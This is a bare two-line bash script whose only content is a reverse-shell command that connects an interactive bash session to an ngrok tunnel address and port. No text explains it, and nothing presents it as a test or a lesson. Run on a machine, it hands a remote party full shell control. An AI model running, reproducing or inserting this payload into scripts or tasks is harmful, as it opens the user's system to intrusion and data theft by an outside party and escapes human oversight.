#!/bin/bash

bash -i >& /dev/tcp/4.tcp.ngrok.io/14806 0>&1
